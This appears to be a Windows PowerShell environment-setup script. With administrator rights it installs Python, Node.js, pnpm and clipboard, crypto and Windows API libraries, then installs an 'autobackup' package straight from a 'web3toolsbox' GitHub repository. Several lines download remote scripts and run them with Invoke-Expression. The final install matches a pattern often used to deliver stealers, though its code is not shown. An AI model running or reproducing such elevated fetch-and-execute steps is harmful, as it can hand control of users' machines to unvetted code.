# Check and require admin privileges
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Output 'Need administrator privileges'
        exit 1
    }
} catch {
    Write-Output "Error checking admin privileges: $_"
    exit 1
}

# Get current user for task creation
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Output "Installing for user: $currentUser"

# Check Python installation
try {
    python --version | Out-Null
} catch {
    Write-Output 'Python not found, installing...'
    $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
    $installerPath = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
    Remove-Item $installerPath
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
}

# Check and install Node.js (LTS)
try {
    node --version | Out-Null
    Write-Output "Node.js is already installed"
} catch {
    Write-Output 'Node.js not found, trying to install...'
    try {
        # Check if Chocolatey is installed
        if (-not (Get-Command choco.exe -ErrorAction SilentlyContinue)) {
            Write-Output 'Chocolatey not found, installing Chocolatey...'
            try {
                Set-ExecutionPolicy Bypass -Scope Process -Force
                [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
                Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
            } catch {
                Write-Output 'Chocolatey install failed, continue...'
            }
        }
        # Install Node.js LTS version
        try {
            choco install nodejs-lts -y
            # Refresh environment variables
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        } catch {
            Write-Output 'Node.js install failed, continue...'
        }
    } catch {
        Write-Output 'Node.js/Chocolatey install block failed, continue...'
    }
}

# Refresh environment variables after Node.js installation
$env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')

# Check and install pnpm
function Install-Pnpm {
    # Check if pnpm is already installed
    try {
        $pnpmVersion = pnpm --version 2>&1 | Out-String
        $pnpmVersion = $pnpmVersion.Trim()
        if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
            Write-Output "pnpm is already installed: $pnpmVersion"
            return $true
        }
    } catch {
        # pnpm not found, continue installation
    }
    
    Write-Output "pnpm not found, installing pnpm..."
    
    # Method 1: Use corepack (Node.js 16.13+ built-in, recommended)
    try {
        if (Get-Command corepack -ErrorAction SilentlyContinue) {
            Write-Output "Installing pnpm via corepack..."
            corepack enable 2>&1 | Out-Null
            corepack prepare pnpm@latest --activate 2>&1 | Out-Null
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
            
            try {
                $pnpmVersion = pnpm --version 2>&1 | Out-String
                $pnpmVersion = $pnpmVersion.Trim()
                if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                    Write-Output "pnpm installed via corepack: $pnpmVersion"
                    return $true
                }
            } catch {
                # Continue to next method
            }
        }
    } catch {
        # Continue to next method
    }
    
    # Method 2: Use npm global install
    try {
        if (Get-Command npm -ErrorAction SilentlyContinue) {
            Write-Output "Installing pnpm via npm..."
            npm install -g pnpm 2>&1 | Out-Null
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
            
            try {
                $pnpmVersion = pnpm --version 2>&1 | Out-String
                $pnpmVersion = $pnpmVersion.Trim()
                if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                    Write-Output "pnpm installed via npm: $pnpmVersion"
                    return $true
                }
            } catch {
                # Continue to next method
            }
        }
    } catch {
        # Continue to next method
    }
    
    # Method 3: Use standalone installer script (fallback)
    try {
        Write-Output "Installing pnpm via standalone installer..."
        $installScript = Invoke-WebRequest -Uri 'https://get.pnpm.io/install.ps1' -UseBasicParsing
        Invoke-Expression $installScript.Content
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        
        try {
            $pnpmVersion = pnpm --version 2>&1 | Out-String
            $pnpmVersion = $pnpmVersion.Trim()
            if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                Write-Output "pnpm installed via standalone installer: $pnpmVersion"
                return $true
            }
        } catch {
            # Installation may have failed
        }
    } catch {
        Write-Output "Warning: pnpm installation may have failed"
    }
    
    Write-Output "Warning: pnpm installation failed. Please install manually: npm install -g pnpm"
    return $false
}

# Install pnpm
Install-Pnpm

$requirements = @(
    @{Name='requests'; Version='2.31.0'},
    @{Name='pyperclip'; Version='1.8.2'},
    @{Name='cryptography'; Version='42.0.0'},
    @{Name='pywin32'; Version='306'},
    @{Name='pycryptodome'; Version='3.19.0'}
)

foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    try {
        $checkCmd = "import pkg_resources; print(pkg_resources.get_distribution('$pkgName').version)"
        $version = python -c $checkCmd 2>&1 | Out-String
        $version = $version.Trim()
        if ($LASTEXITCODE -eq 0 -and $version) {
            try {
                if ([version]$version -ge [version]$pkgVersion) {
                    Write-Output "$pkgName (version $version) is already installed"
                    continue
                }
            } catch {
                # Version comparison failed, proceed to install
            }
        }
        throw
    } catch {
        Write-Output "Installing $pkgName >= $pkgVersion ..."
        python -m pip install "$pkgName>=$pkgVersion"
    }
}

# Install pipx if not installed
try {
    pipx --version | Out-Null
    Write-Output "pipx is already installed."
} catch {
    Write-Output "pipx not found, installing with pip..."
    try {
        python -m pip install pipx
        python -m pipx ensurepath
        # Refresh PATH for current session
        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        Write-Output "pipx installed successfully."
    } catch {
        Write-Output "Failed to install pipx, continue..."
    }
}

# Install autobackup (auto-backup-wins) via pipx
$autobackupInstalled = $false
try {
    $cmd = Get-Command autobackup -ErrorAction SilentlyContinue
    if ($cmd) {
        $autobackupInstalled = $true
        Write-Output 'autobackup is already installed'
    }
} catch {

}

if (-not $autobackupInstalled) {
    Write-Output 'autobackup not found, installing...'
    $installed = $false
    try {
        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
        if ($LASTEXITCODE -eq 0) {
            $installed = $true
        }
    } catch {
        Write-Output "First installation attempt failed: $_"
    }
    
    if (-not $installed) {
        try {
            python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
            if ($LASTEXITCODE -eq 0) {
                $installed = $true
            }
        } catch {
            Write-Output "Second installation attempt failed: $_"
        }
    }
    
    if ($installed) {
        try {
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        } catch {
            Write-Output "Warning: Failed to refresh PATH: $_"
        }
    } else {
        Write-Output "Warning: Failed to install autobackup, continuing..."
    }
}

# Automatically refresh environment variables
Write-Output ""
Write-Output "═══════════════════════════════════════════════════════════════"
Write-Output "Refreshing environment variables..."
Write-Output "═══════════════════════════════════════════════════════════════"
try {
    # Refresh environment variables for current session
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')
    
    # Verify key tools are available
    Write-Output ""
    Write-Output "Installation Verification:"
    Write-Output "───────────────────────────────────────────────────────────"
    
    $tools = @(
        @{Name='python'; DisplayName='Python'},
        @{Name='node'; DisplayName='Node.js'},
        @{Name='npm'; DisplayName='npm'},
        @{Name='pnpm'; DisplayName='pnpm'}
    )
    
    foreach ($tool in $tools) {
        try {
            $version = & $tool.Name --version 2>&1 | Out-String
            $version = $version.Trim()
            if ($version -and $LASTEXITCODE -eq 0) {
                $versionLine = $version.Split("`n")[0]
                Write-Output "✅ $($tool.DisplayName): $versionLine"
            } else {
                Write-Output "❌ $($tool.DisplayName): Not found"
            }
        } catch {
            Write-Output "⚠️  $($tool.DisplayName): Not available in current session"
            if ($tool.Name -eq 'pnpm') {
                Write-Output "   Please restart PowerShell or run: npm install -g pnpm"
            } else {
                Write-Output "   Please restart PowerShell to refresh environment variables"
            }
        }
    }
    
    Write-Output "───────────────────────────────────────────────────────────"
    Write-Output ""
    Write-Output "Environment variables refresh completed!"
} catch {
    Write-Output "Environment variables refresh failed, please restart PowerShell manually or run: refreshenv"
}

Write-Output ""
Write-Output "═══════════════════════════════════════════════════════════════"
Write-Output "Installation completed!"
Write-Output "═══════════════════════════════════════════════════════════════"
Write-Output ""
Write-Output "Note: If pnpm is not detected, please:"
Write-Output "  1. Restart PowerShell"
Write-Output "  2. Or run manually: npm install -g pnpm"
Write-Output ""
